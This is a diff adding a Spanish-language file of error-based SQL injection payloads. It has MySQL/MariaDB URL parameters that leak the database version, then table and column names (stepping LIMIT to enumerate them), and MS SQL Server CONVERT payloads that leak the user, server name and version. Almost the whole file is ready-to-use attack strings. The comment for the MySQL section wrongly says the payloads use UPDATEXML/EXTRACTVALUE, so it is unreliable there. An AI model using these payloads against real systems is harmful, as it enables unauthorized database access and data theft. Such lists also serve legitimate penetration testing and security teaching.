@@ -1,0 +1,34 @@
+# =========================================================
+# PAYLOADS SQLI BASADO EN ERRORES (Error-Based SQLi)
+# =========================================================
+# Este ataque fuerza a la base de datos a generar un mensaje de error que 
+# incluye información sensible de la consulta (ej. versión de la DB, nombres de tablas).
+
+# 1. PAYLOADS COMUNES (MySQL/MariaDB)
+# -----------------------------------
+# Utilizan funciones como UPDATEXML o EXTRACTVALUE que están diseñadas para generar 
+# un error si se les proporciona una ruta XML inválida, y usan esa ruta para inyectar la consulta.
+
+# 1.1 Obtener la versión de la base de datos
+# Contexto: Se inyecta la consulta maliciosa como argumento de una función que espera XML válido.
+# URL: ?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(0x7c, @@version, 0x7c, floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) -- 
+
+# 1.2 Obtener nombres de tablas
+# Reemplazar 'database_name' con el nombre de la DB objetivo (ej. 'tienda').
+# URL: ?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(0x7c, (SELECT table_name FROM information_schema.tables WHERE table_schema='database_name' LIMIT 0,1), 0x7c, floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) -- 
+# Nota: La parte 'LIMIT 0,1' debe incrementarse (0,1 -> 1,1 -> 2,1) para obtener la siguiente tabla.
+
+# 1.3 Obtener nombres de columnas
+# Reemplazar 'table_name' con el nombre de la tabla objetivo.
+# URL: ?id=1' AND (SELECT 1 FROM (SELECT count(*), concat(0x7c, (SELECT column_name FROM information_schema.columns WHERE table_name='table_name' LIMIT 0,1), 0x7c, floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) -- 
+
+# 2. PAYLOADS COMUNES (MS SQL Server)
+# -----------------------------------
+# Utiliza las funciones de conversión de tipos (CAST/CONVERT) para forzar un error al convertir 
+# un string a un integer, incluyendo la información de la consulta en el string.
+
+# 2.1 Obtener nombre de usuario de la DB y nombre del servidor
+# URL: ?id=1' AND 1=CONVERT(int,(SELECT 'X'+(user_name()+'|'+@@servername))) -- 
+
+# 2.2 Obtener la versión de la DB
+# URL: ?id=1' AND 1=CONVERT(int,(SELECT 'X'+(@@version))) --
